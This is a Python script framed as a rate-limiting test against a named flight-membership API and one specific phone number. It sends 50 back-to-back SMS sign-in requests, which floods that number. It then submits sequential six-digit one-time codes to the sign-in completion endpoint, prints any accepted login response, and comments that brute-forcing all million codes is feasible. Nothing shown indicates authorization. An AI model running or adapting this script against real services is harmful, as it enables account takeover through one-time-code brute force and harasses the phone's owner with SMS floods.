#!/usr/bin/env python3
"""
Extended SMS Rate Limiting Test
Tests with larger sample sizes to definitively prove/disprove rate limiting
"""

import requests
import json
import time
from datetime import datetime

API_URL = "https://vauntapi.flyvaunt.com"
VALID_PHONE = "+13035234453"

print("="*80)
print("EXTENDED SMS RATE LIMITING TEST")
print("="*80)
print(f"Started: {datetime.now()}")
print(f"Target: {VALID_PHONE}")
print()

results = []

# Test 1: Extended SMS initiation (50 requests)
print("\n" + "="*80)
print("TEST 1: EXTENDED SMS INITIATION (50 REQUESTS)")
print("="*80)
print("This will definitively test if rate limiting exists...")
print()

for i in range(50):
    start = time.time()
    try:
        r = requests.post(
            f"{API_URL}/v1/auth/initiateSignIn",
            json={"phoneNumber": VALID_PHONE},
            timeout=10
        )
        elapsed = time.time() - start
        
        result = {
            "test": "extended_sms_init",
            "attempt": i+1,
            "status": r.status_code,
            "elapsed": elapsed,
            "response": r.text[:100]
        }
        results.append(result)
        
        print(f"  Attempt {i+1:3}/50: Status {r.status_code:3} ({elapsed:.2f}s) - {r.text[:50]}")
        
        # Check for rate limiting
        if r.status_code == 429:
            print(f"\n✅ RATE LIMITING DETECTED AT ATTEMPT {i+1}!")
            print(f"   Response: {r.text}")
            break
        elif r.status_code != 200:
            print(f"   ⚠️ Unexpected status: {r.text[:80]}")
        
        time.sleep(0.2)  # Small delay between requests
        
    except Exception as e:
        print(f"  Attempt {i+1:3}/50: ERROR - {str(e)[:50]}")
        results.append({
            "test": "extended_sms_init",
            "attempt": i+1,
            "error": str(e)
        })

# Summary
sms_successes = [r for r in results if r.get('status') == 200]
sms_rate_limited = [r for r in results if r.get('status') == 429]

print(f"\n📊 SMS Initiation Summary:")
print(f"   Total attempts: {len(results)}")
print(f"   Successful (200): {len(sms_successes)}")
print(f"   Rate limited (429): {len(sms_rate_limited)}")

if len(sms_rate_limited) > 0:
    print(f"\n✅ RATE LIMITING CONFIRMED - Triggered at attempt {sms_rate_limited[0]['attempt']}")
elif len(sms_successes) == 50:
    print(f"\n🚨 NO RATE LIMITING - All 50 requests succeeded!")
else:
    print(f"\n⚠️ INCONCLUSIVE - Got {len(sms_successes)} successes, need to investigate other responses")

# Test 2: Extended code verification (50+ attempts)
print("\n" + "="*80)
print("TEST 2: EXTENDED CODE VERIFICATION (50+ ATTEMPTS)")
print("="*80)
print("Testing if code verification has rate limiting/lockout...")
print()

# First, trigger a fresh SMS
print("Triggering SMS...")
init_result = requests.post(
    f"{API_URL}/v1/auth/initiateSignIn",
    json={"phoneNumber": VALID_PHONE},
    timeout=10
)
print(f"SMS triggered: {init_result.status_code}")
print()

verify_results = []

for i in range(100):  # Try 100 verification attempts
    start = time.time()
    fake_code = f"{i:06d}"  # Use sequential codes for testing
    
    try:
        r = requests.post(
            f"{API_URL}/v1/auth/completeSignIn",
            json={
                "phoneNumber": VALID_PHONE,
                "challengeCode": fake_code
            },
            timeout=10
        )
        elapsed = time.time() - start
        
        result = {
            "test": "extended_code_verify",
            "attempt": i+1,
            "code": fake_code,
            "status": r.status_code,
            "elapsed": elapsed,
            "response": r.text[:100]
        }
        verify_results.append(result)
        
        # Print every 10th attempt, or important status codes
        if (i+1) % 10 == 0 or r.status_code not in [400]:
            print(f"  Attempt {i+1:3}/100: Code {fake_code}, Status {r.status_code:3} ({elapsed:.2f}s)")
        
        # Check for various blocking mechanisms
        if r.status_code == 429:
            print(f"\n✅ RATE LIMITING DETECTED AT ATTEMPT {i+1}!")
            print(f"   Response: {r.text}")
            break
        elif r.status_code == 403:
            print(f"\n✅ ACCOUNT LOCKED/FORBIDDEN AT ATTEMPT {i+1}!")
            print(f"   Response: {r.text}")
            break
        elif r.status_code == 200:
            print(f"\n🎯 CODE ACCEPTED AT ATTEMPT {i+1}! (Code: {fake_code})")
            print(f"   Response: {r.text[:200]}")
            break
        elif "locked" in r.text.lower() or "blocked" in r.text.lower():
            print(f"\n✅ ACCOUNT LOCKED MESSAGE AT ATTEMPT {i+1}!")
            print(f"   Response: {r.text}")
            break
        
        time.sleep(0.15)  # Small delay
        
    except Exception as e:
        print(f"  Attempt {i+1:3}/100: ERROR - {str(e)[:50]}")
        verify_results.append({
            "test": "extended_code_verify",
            "attempt": i+1,
            "error": str(e)
        })

# Summary
verify_successes = [r for r in verify_results if r.get('status') == 200]
verify_failures = [r for r in verify_results if r.get('status') == 400]
verify_rate_limited = [r for r in verify_results if r.get('status') == 429]
verify_forbidden = [r for r in verify_results if r.get('status') == 403]

print(f"\n📊 Code Verification Summary:")
print(f"   Total attempts: {len(verify_results)}")
print(f"   Failed (400): {len(verify_failures)}")
print(f"   Accepted (200): {len(verify_successes)}")
print(f"   Rate limited (429): {len(verify_rate_limited)}")
print(f"   Forbidden (403): {len(verify_forbidden)}")

if len(verify_rate_limited) > 0 or len(verify_forbidden) > 0:
    block_attempt = verify_rate_limited[0]['attempt'] if verify_rate_limited else verify_forbidden[0]['attempt']
    print(f"\n✅ BLOCKING CONFIRMED - Triggered at attempt {block_attempt}")
elif len(verify_failures) == len(verify_results):
    print(f"\n🚨 NO RATE LIMITING - All {len(verify_results)} invalid code attempts were processed!")
    print(f"   This means brute forcing {1000000} codes is theoretically possible")
    print(f"   Estimated time: {len(verify_results) * 0.5 / 3600:.1f} hours for this sample")

# Save results
output = {
    "sms_initiation": results,
    "code_verification": verify_results,
    "summary": {
        "sms_rate_limited": len(sms_rate_limited) > 0,
        "code_rate_limited": len(verify_rate_limited) > 0 or len(verify_forbidden) > 0,
        "sms_attempts": len(results),
        "verify_attempts": len(verify_results)
    }
}

with open('extended_rate_limit_results.json', 'w') as f:
    json.dump(output, f, indent=2)

print(f"\n✅ Results saved to extended_rate_limit_results.json")
print(f"\nCompleted: {datetime.now()}")
print("="*80)
